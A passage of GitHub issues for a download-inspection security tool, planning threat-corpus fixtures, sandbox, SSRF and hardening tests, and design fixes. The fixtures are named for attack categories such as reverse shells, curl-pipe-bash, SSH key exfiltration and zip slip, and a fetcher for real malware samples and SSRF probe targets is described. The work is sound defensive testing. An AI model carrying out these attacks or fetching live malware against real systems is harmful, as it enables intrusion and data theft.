title: feat(test): sandbox escape verification tests (paired happy/adversarial)
body:
Part of epic #310. Blocks #311, #312, #313.

## Goal

Create a structured threat corpus under `fixtures/` with safe, synthetic test samples for every detection category, plus on-demand fetching from public malware databases for VM-based e2e tests. Never commit real malware to git (GitHub dual-use policy allows research fixtures but not malware-as-CDN).

## Layout

```
fixtures/
├── corpus/
│   ├── INDEX.toml              # sha256 + family + source + expected_verdict for each sample
│   ├── fetch.rs                # build script: downloads by hash, verifies SHA-256, never stores in git
│   └── README.md
├── eicar/
│   ├── plain.txt               # EICAR test string (68 bytes) — safe to commit
│   ├── eicar.zip               # EICAR in ZIP — safe to commit
│   ├── eicar_encrypted.zip     # EICAR in encrypted ZIP (password: "infected") — safe to commit
│   ├── eicar_double.zip        # EICAR double-zipped (recursive depth test) — safe to commit
│   ├── eicar.tar.gz            # EICAR in tarball — safe to commit
│   └── eicar.7z                # EICAR in 7z — safe to commit
├── shell/
│   ├── clean.sh                # benign script
│   ├── curl_pipe_bash.sh       # download-and-execute
│   ├── base64_decode_exec.sh   # obfuscated execution
│   ├── nc_reverse_shell.sh     # reverse shell
│   ├── ssh_key_exfil.sh        # credential access
│   ├── crontab_persist.sh      # persistence
│   ├── rm_rf_root.sh           # destructive behavior
│   ├── sudo_attempt.sh         # privilege escalation
│   └── ... (one per 28+ categories)
├── archive/
│   ├── zip_slip.zip            # path traversal
│   ├── symlink_escape.zip      # symlink to /etc
│   ├── zip_bomb.zip            # high compression ratio
│   ├── duplicate_entries.zip   # overwriting entries
│   └── ... (one per 15 hazard types)
└── README.md
```

## On-demand malware sample fetching

### Public databases integrated

| Database | URL | Access | Use case |
|----------|-----|--------|----------|
| **MalwareBazaar** (abuse.ch) | https://bazaar.abuse.ch/ | Free API (Auth-Key required), 2,000 downloads/day | Fetch by SHA256, filter by family/tag/YARA rule |
| **theZoo** (ytisf/theZoo) | https://github.com/ytisf/theZoo | GitHub repo, password-protected ZIPs (pw: `infected`) | Curated Linux malware (Mirai, backdoors, rootkits) |
| **VX Underground** | https://vx-underground.org/ | Direct download + torrents | APT samples, historical malware, source code |
| **MalShare** | https://malshare.com/ | Free API key, daily quota | Automated bulk sample fetching |
| **EICAR** | https://www.eicar.org/ | Direct download (68 bytes) | Baseline detection, safe to commit |

### `INDEX.toml` format

```toml
# Safe synthetic samples (committed to git)
[[sample]]
name = "eicar_plain"
sha256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf65cfd7a"
source = "inline"           # generated at build time, not fetched
expected_verdict = "block"
expected_finding = "MalwareSignature"
tags = ["eicar", "baseline"]

# On-demand samples (fetched by build script, never committed)
[[sample]]
name = "mirai_x86_elf"
sha256 = "..."
source = "malwarebazaar"    # or "thezoo", "malshare", "vxunderground"
family = "Mirai"
expected_verdict = "block"
expected_finding = "MalwareSignature"
tags = ["elf", "botnet", "linux"]

[[sample]]
name = "bash_backdoor_reverse_shell"
sha256 = "..."
source = "thezoo"
family = "Linux/Backdoor"
expected_verdict = "block"
expected_finding = "SuspiciousScriptBehavior"
tags = ["bash", "backdoor", "reverse-shell"]
```

### Build script (`fixtures/corpus/fetch.rs`)

- Reads `INDEX.toml` entries where `source != "inline"`
- For MalwareBazaar: `POST https://mb-api.abuse.ch/api/v1/` with `query=get_file&sha256_hash=...`
- For theZoo: `git clone --depth 1 https://github.com/ytisf/theZoo` (or sparse checkout)
- For MalShare: `GET https://malshare.com/api.php?api_key=...&action=getfile&hash=...`
- Verifies SHA-256 of downloaded file
- Stores in `target/corpus/` (gitignored, ephemeral)
- Password-protected ZIPs are extracted with password `infected`
- API keys read from env vars (`MALWAREBAZAAR_AUTH_KEY`, `MALSHARE_API_KEY`)
- **Never downloads if running outside a VM or sandbox** — gated by `--features vm-tests`

## `arbitraitor-testkit::corpus` module

- `corpus::eicar_plain() -> &[u8]` — returns the EICAR test string (inline)
- `corpus::eicar_zip() -> &[u8]` — returns EICAR in a ZIP (inline)
- `corpus::shell_script(category: &str) -> &[u8]` — returns a synthetic script for the given detection category
- `corpus::archive_hazard(hazard_type: &str) -> &[u8]` — returns a synthetic archive with the given hazard
- `corpus::malware_sample(name: &str) -> PathBuf` — returns path to a fetched sample in `target/corpus/`
- `corpus::INDEX` — static array of all samples with their expected verdicts

## Acceptance

- All in-repo fixtures are synthetic (no real malware)
- EICAR variants cover all 6 archive formats supported by `arbitraitor-archive`
- Shell scripts cover all 28+ detection categories from `arbitraitor-shell`
- Archive hazards cover all 15 hazard types
- `corpus::INDEX` is validated in tests (every fixture has a matching entry)
- On-demand fetching works for MalwareBazaar, theZoo, and MalShare
- Fetched samples are never committed to git
- `fetch.rs` refuses to download unless `--features vm-tests` is active
- Fixtures are small (< 10 KB each, except EICAR-in-zip-bomb)

title: feat(test): network isolation verification (connect-back + DNS rebinding)
body:
Part of epic #310. Depends on #312 (Tier 3 testcontainers).

## Goal

Verify that network isolation in the sandbox actually blocks outbound connections, including DNS rebinding attacks.

## Test cases

### Connect-back tests
- Bind a listener on the parent network namespace on a unique port
- Run a sandboxed process that attempts `connect()` to that port
- Assert: listener does NOT receive a connection within timeout → sandbox is enforcing
- Assert: sandboxed process receives ECONNREFUSED or EACCES

### DNS rebinding tests (using rebindx pattern)
- Configure a DNS rebinder to alternate between a safe IP and 127.0.0.1
- First resolution returns safe IP → allowed
- Second resolution returns 127.0.0.1 → must be rejected by SSRF protection
- Verify arbitraitor rejects the rebinding attempt with appropriate error

### SSRF address validation (using testcontainers)
- Spin up a "fake internal service" in a Docker container
- Attempt `arbitraitor inspect http://127.0.0.1:<port>/` → must be blocked
- Attempt `arbitraitor inspect http://172.17.0.1:<port>/` (Docker bridge) → must be blocked
- Attempt `arbitraitor inspect http://169.254.169.254/` (cloud metadata) → must be blocked
- Attempt `arbitraitor inspect http://[::1]/` (IPv6 loopback) → must be blocked

### Mutable URL response test
- Serve different content on first vs second fetch (using wiremock)
- Verify that arbitraitor detects content mutation and blocks

## Acceptance

- All blocked attempts produce a clear error message explaining why
- No real network access required (all using testcontainers + wiremock)
- DNS rebinding test uses a self-hosted rebindx or rbndr.us pattern

title: feat(test): process hardening verification (ptrace, prctl, setrlimit)
body:
Part of epic #310. Depends on #313 (threat corpus), #314 (Tier 4 vmtest).

## Goal

Verify that the `arbitraitor-sandbox` crate's process hardening (prctl, close_range, setrlimit) actually works by testing from outside the sandboxed process.

## Pattern (from OpenAI codex-rs process-hardening)

The codex-rs project applies hardening in pre_main:
```rust
prctl(PR_SET_DUMPABLE, 0, ...);  // non-dumpable
setrlimit(RLIMIT_CORE, 0, ...); // no core dumps
```

Arbitraitor's sandbox crate does the same for child processes. These tests verify the hardening is effective.

## Test cases

### ptrace protection
- Fork a child with `prctl(PR_SET_DUMPABLE, 0)` applied
- From the parent, attempt `ptrace(PTRACE_ATTACH, child_pid)`
- Assert: returns -1 with errno EPERM

### Core dump suppression
- Fork a child with `setrlimit(RLIMIT_CORE, 0)` applied
- Child calls `abort()` (generates SIGABRT)
- Parent waits for child with WCOREDUMP
- Assert: WCOREDUMP is false (no core file generated)

### File descriptor closure (close_range)
- Fork a child with specific FDs open
- Apply `close_range()` to close inherited FDs
- Child attempts to read from a closed FD
- Assert: returns EBADF

### Environment variable sanitization
- Fork a child with `LD_PRELOAD` and other `LD_*` variables in environment
- Apply env sanitization (remove LD_*, DYLD_*)
- Assert: child's environment does not contain any `LD_*` or `DYLD_*` variables

## Acceptance

- Tests run both in-process (fast unit tests) and in vmtest VM (kernel-level verification)
- Each test asserts specific errno values, not just "failed"
- Tests are tagged with the prctl/setrlimit constant they verify

title: feat(test): real network-level fetch testing infrastructure (HTTPS, SSRF, TCP truncation)
body:
## Problem

`crates/arbitraitor-testkit/src/mock_server.rs` has 4 TODOs documenting that WireMock-based HTTP mocking cannot test:

1. **HTTPS downgrade** — WireMock serves HTTP only; TLS downgrade detection needs a real HTTPS server
2. **Real SSRF** — WireMock binds to the mock address; real SSRF controls need a custom TCP listener on private IPs
3. **TCP-level truncation** — Hyper/WireMock rejects mismatched Content-Length; truncation testing needs a raw TCP server
4. **Real SSRF (dup)** — same as #2

## Proposed solution

Build a lightweight `raw_tcp_server` module in `arbitraitor-testkit` that:
- Spawns a `std::net::TcpListener` on a random port
- Supports: TLS handshake with self-signed cert (HTTPS downgrade), raw TCP responses (truncation), connection on 127.0.0.1 (real SSRF)
- Integrates with existing WireMock infrastructure as a complement

## Scope

- `arbitraitor-testkit/src/raw_tcp.rs` — TcpListener-based server helpers
- Update `mock_server.rs` TODOs to reference this issue
- Integration tests in `arbitraitor-fetch` for TLS downgrade, SSRF rejection, truncation detection

## Related

- Original TODOs in mock_server.rs (lines 68, 100, 135, 182)
- References stale #33 (which was about implementing the policy, not testing it)
- Spec §11.2, §43.2

## Problem

`crates/arbitraitor-plugin-host/src/wasm_plugin.rs:83-94` returns `Vec::new()` with comment "will be wired in a follow-up." ADR-0006 (Wasmtime Component Model plugins) is marked **Accepted** but the core analyze path is unimplemented.

The inventory "0 production TODO markers" check missed this because it's a comment, not a macro.

## Acceptance criteria

Decision needed first: **DEC-4** (WasmPlugin fate)

If **implement** (XL):
- [ ] WIT-based analyze bridge implemented
- [ ] Plugin returns real findings (not empty)
- [ ] Test with a fixture Wasm plugin

If **feature-gate** (S):
- [ ] `WasmPlugin` behind `experimental-wasm` feature, default off
- [ ] `analyze` returns `Err(NotImplemented)` not `Ok(vec![])`
- [ ] ADR-0006 marked "partially implemented" in `docs/adr/README.md`

## Severity

HIGH — users believe Wasmtime plugins work; they silently produce zero findings

title: fix(exec): route native release through safe-destination per ADR-0015
body:
## Problem

`crates/arbitraitor-cli/src/run/run_services.rs:280-293` writes native binary directly to `~/.arbitraitor/native/<sha>.bin` via `std::fs::write`, then chmods and executes. ADR-0015 explicitly rejects `std::fs::write` (`docs/adr/0015-safe-destination-release-semantics.md:92-99`).

Native resource limits (prlimit) applied **after spawn** (`crates/arbitraitor-exec/src/native.rs:123-130`) → fork-before-prlimit race (contrast plugin fix pre-exec at `crates/arbitraitor-plugin-host/src/executor.rs:172-185`).

## Acceptance criteria

- [ ] `run_services.rs:280-293` no longer calls `std::fs::write`; uses `arbitraitor_exec::release::release_artifact` into capability-rooted native cache with `O_NOFOLLOW` + no-overwrite
- [ ] Resource limits applied in `pre_exec` hook, mirroring `plugin-host/src/executor.rs:172-185`
- [ ] Test: native binary execution with pre-created symlink in target path fails, does not overwrite
- [ ] Test: resource limits visible in `/proc/<pid>/limits` at spawn time (not after)

## Severity

HIGH (ADR violation clear; exploit context incomplete but invariant broken regardless)

## Context

Discovered during 5-member adversarial hyperplan review.

title: fix(cli): shim install generates broken package-manager shims
body:
## Problem

`crates/arbitraitor-cli/src/commands.rs:615-617` writes `exec {arb} pm run --tool {tool} -- "$@"` but the CLI enum has **no `Pm` variant** (`main.rs:62-88`). Installing a package-manager shim creates a broken command that fails open to the underlying tool.

Independently found by 3 of 5 reviewers during adversarial cross-attack.

## Acceptance criteria

- [ ] `shim install` never generates a command that fails open to the underlying tool
- [ ] Every shim target has a working dispatch path (test invokes the shim with `--help` and gets Arbitraitor output)
- [ ] `book/src/cli-reference.md` reflects the actual shim targets

## Decision needed first

DEC-3 (package-manager crate fate): if implementing `pm`, add the subcommand; if removing/experimental, delete package-manager shim targets and document curl/wget-only scope.

## Severity

HIGH — broken first-run UX, security-relevant (fails open)

title: security(config): enforce monotonic project config per ADR-0017
body:
## Problem

`arbitraitor-core/src/config.rs:365-390` auto-loads `.arbitraitor/config.toml` from CWD and merge at `670-733` can **weaken** inherited security settings: disable detectors, relax integrity, enable execution, add trust roots. This violates:

- **Spec invariant** §9 (line 473-474): "project config may only tighten, cannot add trust roots/enable plugins/weaker execution"
- **ADR-0017** (`docs/adr/0017-monotonic-project-configuration.md:16-18,41-67`): requires explicit opt-in, monotonic validation, digest in receipt, property tests

The existing test `tests/threat_model_adversaries.rs:41-82` validates **successful override**, not rejection of weakening.

## Attack path

A malicious repo ships `.arbitraitor/config.toml` disabling detectors / setting `default_action = "pass"` / relaxing integrity. A user (or CI / AI agent) runs Arbitraitor from inside the repo — policy silently weakens.

## Acceptance criteria

- [ ] `TrustedConfig` and `UntrustedProjectOverlay` types in `arbitraitor-core/src/config.rs`; CWD config loads as the latter only
- [ ] Merge layer rejects any overlay that adds trust roots, enables plugins, enables execution, weakens integrity, or disables detectors — returns `Err` with specific violation
- [ ] Property test (proptest) enumerates each forbidden relaxation and asserts rejection
- [ ] Existing test rewritten to assert **rejection of weakening**, not successful override
- [ ] Receipt records `config_origin` with digest of contributing config layers

## Severity

HIGH (downgraded from CRITICAL during adversarial review — reachable but requires running inside attacker-controlled project dir, common in CI/agent workflows)

## Context

Discovered during 5-member adversarial hyperplan review. See work plan for full context.

title: security(exec): require control proofs for Contained assurance level
body:
## Problem

`ExecutionContextBuilder` build does NOT require control proofs for `Contained` (`exec/lib.rs:743-768,790-795,897-912`). Native explicitly sets `AssuranceLevel::Contained` while only doing prctl + post-spawn limits (`native.rs:140-151`). Receipt has no effective-controls matrix (`receipt/lib.rs:20-52`).

ADR-0007 mandates per-control matrix and fail-closed when unavailable (`docs/adr/0007-assurance-levels-model.md:43-61,63-90`).

## Acceptance criteria

- [ ] Builder requires control proofs for `Contained`; missing proof → build fails or downgrades to `Mediated`
- [ ] `EffectiveControls` struct in exec crate, emitted in receipt
- [ ] Native executor may not self-assert `Contained` without platform probe
- [ ] Receipt includes effective-controls matrix (per-control: requested/applied/failed)
- [ ] Tests: builder rejects Contained w/o proofs; receipt serializes matrix; fail-closed on unavailable control

## Severity

MEDIUM — mislabeling containment is a receipt-honesty issue

title: docs(book): cli-reference claims global flags that don't exist in CLI
body:
## Problem

`book/src/cli-reference.md:34-45` claims global `--policy`, `--output`, `--log-level`, `--no-color`, `--quiet` but actual `Cli` struct has only `--verbose` and `--config` (`main.rs:49-59`).

## Acceptance criteria

Decision needed: **DEC-5** (implement vs fix docs)

If **implement** (M):
- [ ] `Cli` struct gains the global flags
- [ ] Tests assert global behavior
- [ ] `cli-reference.md` accurate

If **fix docs** (S):
- [ ] `cli-reference.md:34-45` rewritten to document only `--verbose` and `--config`

## Severity

HIGH — docs advertise non-existent security-relevant flags (--policy)

title: security(plugin): enforce capability admission per ADR-0011 trust tiers
body:
## Problem

`PluginManifest` HAS `capabilities: CapabilitySet` field (`plugin-api/lib.rs:169-180`), but registry always fills `CapabilitySet::default()` (`registry.rs:310-319`). `validate_for_plugin_capabilities` has NO production callers — only unit test (`plugin-api/lib.rs:228-243`).

ADR-0011 requires: community plugins no network/process/arbitrary FS; wrappers/trusted first-party in enforcement (`docs/adr/0011-plugin-trust-classification.md:24-35,46-72`).

`with_network_isolated(false)` accepts raw bool, no trust check (`executor.rs:130-138`).

## Acceptance criteria

- [ ] Manifest schema declares requested capabilities
- [ ] Plugin registry admission enforces ADR-0011 trust-tier defaults
- [ ] `validate_for_plugin_capabilities` has production callers in registry admission path
- [ ] `with_network_isolated(false)` constructor requires a capability token derived from policy, not raw bool
- [ ] Tests: community plugin requesting network capability rejected at admission; first-party wrapper admitted with policy token

## Severity

HIGH — security boundary is advisory, not enforced

title: security(cli): plan-bound CLI approval per §28.5 (interpreter+argv+env+grants+nonce)
body:
## Problem

CLI `approve` writes only `artifact_sha256/approved_at/expires_at/verdict` (`commands.rs:722-727`). Spec §28.5 requires `interpreter+argv+env+grants+policy/detector digest+nonce+approver` (`spec.md:2374-2387`).

MCP `ApprovalTokenIssuer` is more complete (`mcp/lib.rs:798-943`). The weak path is CLI approve/execute specifically.

## Acceptance criteria

- [ ] CLI `approve` writes plan-bound fields per §28.5
- [ ] CLI `execute` recomputes plan digest from approval file and to-be-executed plan; rejects mismatch
- [ ] Property test: any field tampered after approval → execute fails
- [ ] Approval file schema versioned

## Severity

MEDIUM — approval is weaker than spec requires

title: docs(adr): correct ADR acceptance status — 5 ADRs are Proposed not Accepted
body:
## Problem

`docs/adr/README.md:46-50` marks ADR-0022 (SLSA), 0023 (in-toto), 0024 (macOS containment), 0025 (Scorecard/GUAC), 0026 (CRA/SSDF) as **Proposed**. Only 0001-0021 are Accepted.

- `AGENTS.md` and `README.md` claim "26 accepted ADRs" — **FALSE**
- Spec §42.7 says "21 accepted ADRs" — correct for accepted count but doesn't acknowledge 5 Proposed
- Issue bodies for #367/#368/#369 claim "ADR accepted" — **FALSE**

## Acceptance criteria

- [ ] `AGENTS.md` line "26 accepted ADRs" corrected to match reality
- [ ] `README.md` corrected
- [ ] `docs/adr/README.md` table matches each ADR file's `**Status:**` line
- [ ] Issue bodies for #367/#368/#369 corrected
- [ ] Spec §42.7 reconciled

## Decision needed

DEC-1: Accept ADR-0022-0026 (→ "26 accepted"), keep Proposed (→ "21 accepted, 5 Proposed"), or reject some. Fix content depends on decision.

## Severity

HIGH — false claims in security-relevant project docs

title: security(exec): enforce no-root invariant at all entry points per §26.6
body:
## Problem

Root check exists only inside `ExecutionContextBuilder::build` (`exec/lib.rs:847-856`). No refusal in CLI/daemon/MCP/plugin-host entry points. Spec §26.6 (`spec.md:2146-2160`): main process, parsers, scanners, plugin hosts must run without elevation.

## Acceptance criteria

- [ ] Process-start guard in CLI main.rs, daemon entry, MCP server boot, plugin-host boot — refuses UID 0
- [ ] `--allow-root` diagnostic flag bypasses with warning (for `doctor`/integration tests only)
- [ ] Tests: each entry point exits non-zero with clear error when EUID=0; `--allow-root` proceeds

## Severity

MEDIUM — ADR-0009 scope is broader than just execution context

title: epic: post-adversarial-review security hardening (11 findings)
body:
## Problem

A 5-member adversarial hyperplan review surfaced 11 security-boundary gaps (3 HIGH, 8 MEDIUM/LOW). This epic tracks them.

## Findings

| # | Finding | Severity | Issue |
|---|---------|----------|-------|
| A1 | Config monotonicity violation | HIGH | #376 |
| A2 | Native release bypasses safe-destination | HIGH | #375 |
| A3 | Plugin capability enforcement advisory | HIGH | #379 |
| A4 | Daemon release uses std::fs::write | MEDIUM | (this epic) |
| A5 | Contained assurance without proof | MEDIUM | #381 |
| A6 | CLI approval not plan-bound | MEDIUM | #382 |
| A7 | SSRF post-connect verification incomplete | MEDIUM | #383 |
| A8 | No-root scoped to execution only | MEDIUM | #384 |
| A9 | Approval nonce in-memory only | MEDIUM | (this epic) |
| A10 | Tirith subprocess unsandboxed | MEDIUM | (this epic) |
| A11 | Receipt signing not wired | LOW | (this epic) |

## Wave structure

- **Wave 1 (parallel, ~9 tasks)**: A1, A2, A3, A5, A6, A7, A8, A9, A10 — independent, no deps
- **Wave 1b (sequential merge)**: A4 (daemon release), A8 (entry-point guard) — coordinate via separate PRs

All fixes use TDD: failing test first, minimal fix, adversarial review by different agent.

## Decision gates

- A4 (daemon release): confirm wire protocol doesn't expose release (already confirmed: Inspect/Scan/QueryReceipt/Health/Shutdown only per `daemon/lib.rs:38-63`)
- A9 (nonce persist): choose redb table vs operation-id ledger
- A11 (receipt signing): DEC-6 gates scope

## Linked plan

Full work plan at hyperplan output. See issues #374-384 for individual tasks.

title: security(fetch): complete SSRF post-connect peer verification per ADR-0018
body:
## Problem

Connected peer only recorded, not compared/rejected (`fetch/lib.rs:702-718`). No HTTPS→HTTP downgrade block when policy allows both schemes (`521-532`).

ADR-0018 requires getpeername verification and abort on mismatch (`docs/adr/0018-ssrf-proxy-connected-peer-verification.md:19-41`).

## Acceptance criteria

- [ ] After connect + response, compare `remote_addr` against approved addresses from connect-phase check; mismatch → abort + redacted error
- [ ] `allow_https_to_http_redirect` policy added, default `false`
- [ ] Tests: peer-swap attack aborted; downgrade blocked by default; explicit policy opt-in allows it

## Severity

MEDIUM — SSRF is strong pre-connect; this closes the post-connect gap

title: docs(spec): resolve §47 scope conflict — daemon and package-manager exceed pre-1.0 scope
body:
## Problem

Spec §47 (`spec.md:6571-6586`) says first public pre-1.0 (v0.4) EXCLUDES "general daemon," "production-grade package-manager mediation," and "public community plugin registry." But code has:
- `arbitraitor-daemon` — full daemon with queue/cache (~2181 LOC)
- `arbitraitor-package-manager` — workspace crate (~1933 LOC)
- Plugin registry scaffolding

## Decision needed

**DEC-2**: Expand §47 scope (acknowledge these as in-scope), or mark both crates experimental/v0.6+ (feature gates + README banners).

## Acceptance criteria

- [ ] If expand: §47.2 removes daemon/pm from out-of-scope list; release notes mention expansion
- [ ] If experimental: daemon + pm crates gain `experimental` feature gates + README banners; §47.2 unchanged; `book/src/architecture/crates.md` marks them experimental

## Severity

MEDIUM — users may rely on experimental crates as if stable

title: security(analysis): sandbox Tirith subprocess and capture receipt metadata
body:
## Problem

`crates/arbitraitor-analysis/src/tirith.rs:109-122` uses raw `Command::new(binary)` with temp-file arg; only timeout/output caps (`131-180`), no `arbitraitor-sandbox` hardening. If Tirith binary is compromised → subprocess execution surface.

Also: Tirith detector `metadata()` returns Arbitraitor crate version, not Tirith binary version/ruleset/binary_sha256.

## Acceptance criteria

- [ ] Tirith subprocess wrapped in `arbitraitor-sandbox` hardening (seccomp/landlock where available)
- [ ] Receipt records `tirith_binary_sha256`, `tirith_version`, `ruleset_digest` in detector metadata
- [ ] Tests: Tirith binary cannot write outside workdir or open arbitrary FDs; metadata present

## Severity

MEDIUM — unsandboxed subprocess in security boundary

title: security(mcp): persist approval nonces for replay protection across restart
body:
## Problem

`spent_nonces` is `Arc<Mutex<HashSet<String>>>` in-memory only (`mcp/lib.rs:765-774`). Approval tokens are replayable after process restart.

## Acceptance criteria

- [ ] `spent_nonces` backed by durable storage (redb table or operation-id ledger)
- [ ] Restart does not lose spent-nonce state
- [ ] Tests: approval used pre-restart is rejected post-restart; fresh approval post-restart succeeds

## Severity

MEDIUM — replay protection defeated by restart

title: security(daemon): route in-process release through safe-release primitive
body:
## Problem

`crates/arbitraitor-daemon/src/api.rs:309-335` `release()` accepts digest, verifies CAS bytes, then `std::fs::write(dest, &bytes)` — no receipt/verdict/policy check, no `release_artifact`, no symlink controls.

Cross-attack refinement: NOT remotely reachable (wire protocol has Inspect/Scan/QueryReceipt/Health/Shutdown only, `daemon/lib.rs:38-63`). In-process API only. Still an ADR-0015 invariant violation.

## Acceptance criteria

- [ ] `release()` delegates to `arbitraitor_exec::release::release_artifact` (or removed/privatized)
- [ ] No `std::fs::write` of artifact bytes to caller-supplied path in daemon crate
- [ ] Test: in-process release requires verdict + policy + receipt, same as CLI path

## Severity

MEDIUM — invariant violation, not remotely exploitable

title: feat(cli): add 'env' as hidden alias of 'wrappers init' + add oil shell support
body:
## Summary

Add `arbitraitor env <shell>` as a hidden alias of `arbitraitor wrappers init --shell <S> --print`. Add `oil` to the `Shell` enum (reuse `posix_snippet` — oil is bash-compatible).

## Context

A 5-member adversarial design debate concluded that proposal #1 (`arbitraitor env <shell>`) **already exists** as `arbitraitor wrappers init` (10 shells, 990 LOC in `init.rs`). The `env` name improves discoverability (competitors split: brew=shellenv, mise=activate, starship/direnv=init/hook — no consensus, so discoverability > naming purity).

**Do NOT** add a new top-level command that fragments the surface. Do NOT fold `hook init` under `env` (§32.6 mandates separation between shell hooks and PATH shims).

## Acceptance criteria

- [ ] `arbitraitor env bash` ≡ `arbitraitor wrappers init --shell bash --print`
- [ ] `arbitraitor env --install` ≡ `arbitraitor wrappers init --install`
- [ ] `arbitraitor env --detect-shell` ≡ `arbitraitor wrappers init --detect-shell`
- [ ] `Oil` variant added to `Shell` enum in `init.rs:33-54` with `posix_snippet` reuse
- [ ] Book/docs updated (`cli-reference.md`, CHANGELOG)
- [ ] `cargo nextest run` green

## Effort: S (CLI alias + one enum variant)

## Prior art

- mise: `mise activate <shell>` (print-only, user edits rc)
- brew: `brew shellenv <shell>` (print-only, user edits rc)
- starship: `starship init <shell>` (print-only)

title: feat(wrappers): add --dry-run and --backup flags to rcfile installation
body:
## Summary

Add `--dry-run` (print unified diff of rcfile change BEFORE writing) and `--backup` (default ON, writes `<rcfile>.arbitraitor.bak` before mutation) to `wrappers init --install`.

## Context

5-member adversarial debate concluded that silent rc-file mutation by a security tool is a footgun. Users must see what's being injected — especially for a product that buffers untrusted content. Current code (`init.rs:467-511`) writes directly via `std::fs::write` with no diff preview, no backup, no atomic rename.

Security-strategist flagged: zsh targets `.zshenv` (runs in non-interactive shells — too broad); partial write on crash; concurrent race; permission hazard (installer under sudo may edit root's rc files).

## Acceptance criteria

- [ ] `--dry-run` prints unified diff of the rcfile change, exits without writing
- [ ] `--backup` (default ON) writes `<rcfile>.arbitraitor.bak` before mutation
- [ ] Atomic write: temp-file + fsync + rename (not direct `std::fs::write`)
- [ ] Ownership check: refuse rcfile writes if file owner != current user or running under sudo with mismatched HOME
- [ ] Consider changing zsh target from `.zshenv` to `.zshrc` (interactive-only — `.zshenv` runs in non-interactive shells too)
- [ ] Tests: dry-run output matches actual diff; backup created; atomic write; ownership refusal

## Effort: M

title: feat(cli): overhaul doctor command with shell-integration health checks
body:
## Summary

Overhaul `arbitraitor doctor` to: (1) make human-readable the DEFAULT (currently JSON-only), (2) add shell-integration health checks, (3) output "Fix shell integration:" nudge.

## Context

UX-designer finding from adversarial debate: `doctor` (`commands.rs:357-378`) dumps raw JSON only — no human-readable mode, no `--json` toggle. It checks CAS store + rule packs but NOT shell-integration state. This is the biggest first-run UX hole.

## Proposed output

```
┌─ Arbitraitor health ──────────────────────────────┐
│ version     0.x.y  ✓                              │
│ store       ~/.arbitraitor/store  ✓ (1.2 GB)      │
│ rules       3 packs loaded  ✓                     │
│ shell       zsh (via $SHELL)  ✓                   │
│ shims       curl, wget  ✓ installed               │
│ PATH        ~/.arbitraitor/shims  ✗ NOT on PATH   │
│ rcfile      ~/.zshenv  ✗ no init block            │
└────────────────────────────────────────────────────┘
Fix shell integration:
  arbitraitor wrappers init --install
```

## Acceptance criteria

- [ ] Human-readable is DEFAULT; `--json` flag keeps JSON for tooling
- [ ] Health checks added: `shell` (detection via existing `detect_shell()`), `shims` (installed state via `check_shims`), `PATH` (is shim_dir on `$PATH`?), `rcfile` (does target rcfile contain marker block?)
- [ ] "Fix shell integration:" nudge printed only for failing checks
- [ ] Exit code: 0 if all healthy, non-zero if any fail

## Effort: M

title: feat(wrapper): deprecate hook init DEBUG trap in favor of PATH-shim model
body:
## Summary

Deprecate `arbitraitor hook init` (bash-only DEBUG trap that pattern-matches `curl|sh`) in favor of the robust, shell-agnostic curl/wget PATH-shim model.

## Context

5-member adversarial debate finding: `hook init` (`commands.rs:549-577`) emits a bash DEBUG trap that runs before EVERY simple command — performance tax, subtle shell semantic breakage (PROMPT_COMMAND interaction, `set -e`, trap chaining, subshells). Crash = shell denial-of-service. Bash-only.

The PATH-shim model (`wrappers install` + `shim install`) is robust, shell-agnostic, and avoids per-command overhead. Security-strategist recommended: "no global preexec trap by default. Restrict to interactive shells, feature-flagged, fail-open with bypass env var `ARBITRAITOR_HOOK_DISABLE=1`."

Research-strategist confirmed: bash-preexec is "hacky/fragile/interference-prone" per its own README + PR discussions. Starship explicitly warns custom preexec via DEBUG trap must be installed before starship and can break if overwritten.

## Acceptance criteria

- [ ] `hook init` marked deprecated with warning in output
- [ ] Docs recommend `wrappers install` + `wrappers init --install` instead
- [ ] If trap is kept as opt-in: add `ARBITRAITOR_HOOK_DISABLE=1` bypass env var
- [ ] If trap is kept: restrict to interactive shells only, fail-open on errors
- [ ] CHANGELOG entry; book updated

## Effort: S (deprecation + docs) or M (if keeping with safeguards)

title: feat(pm): implement 'arb pm run --tool X' subcommand to bridge shims and package-manager adapters
body:
## Summary

Implement the missing `Pm` CLI subcommand that bridges `shim install` (which invokes `arb pm run --tool X`) and the `arbitraitor-package-manager` crate (which has `RegistryAdapter` trait + adapters for cargo/npm/pnpm/yarn/bun but NO CLI wiring).

## Context

5-member adversarial debate finding: `shim install npm` writes `exec {arb} pm run --tool npm -- "$@"` (`commands.rs:615-617`) but `pm` is NOT registered in the `Command` enum (`main.rs:62-88`). ALL package-manager shims are broken. The adapters exist in `arbitraitor-package-manager/src/` but have no CLI dispatch.

## Architecture (from debate)

The `pm run` subcommand should:
1. Resolve the tool from `RegistryTool` enum
2. Look up the adapter (CargoAdapter, NpmAdapter, etc.)
3. Apply the adapter's `InspectionPattern` recipe (RegistryProxy, LockfilePrescan, PostInstallScan, BuildScriptSandbox)
4. Enforce `LifecycleScriptPolicy` (--ignore-scripts, trustlist, sandbox)
5. Emit `PackageManagerReceipt` per §39.14.5

## Phased approach (from research-strategist)

Per prior art: audit first → artifact proxy second → sandbox third → thin PATH wrappers last. The `pm run` command should start with audit (lockfile/manifest scan) before moving to full mediation.

## Acceptance criteria

- [ ] `Command::Pm(PmCommand)` variant added to CLI enum
- [ ] `PmSubcommand::Run { tool, args }` dispatches to `arbitraitor-package-manager` adapters
- [ ] `shim install npm` produces a working shim (test: invoke shim with `--help`, get Arbitraitor output)
- [ ] `shim install cargo` added (adapter exists, needs shim glue)
- [ ] CHANGELOG + book updated

## Dependencies

- Ties to #377 (fix shim install broken pm command) — this IS the fix
- Blocked by DEC-3 (package-manager crate fate) from the hyperplan work plan
- Spec §39.14 defines binding hybrid integration pattern

## Effort: L (new CLI subcommand + adapter wiring + tests)

title: research(adr): seccomp SECCOMP_RET_USER_NOTIF as package-manager mediation architecture
body:
## Summary

Research ADR: seccomp `SECCOMP_RET_USER_NOTIF` as the architecture for package-manager mediation — broker `execve`/`openat` during install/build. Stronger than PATH wrapper (child can't bypass once inside filter). Natural evolution from current seccomp deny filter.

## Context

Research-strategist finding from adversarial debate: "Best alternative architecture for PM mediation: seccomp SECCOMP_RET_USER_NOTIF. Much stronger than PATH wrapper / LD_PRELOAD / proxy. Works when Arbitraitor is parent/supervisor. Can broker execve, openat, etc. during install/build."

This is NOT a PATH wrapper (which can be bypassed by absolute path, sudo, non-interactive shells). seccomp-notify creates a true syscall-level gate.

## Prior art

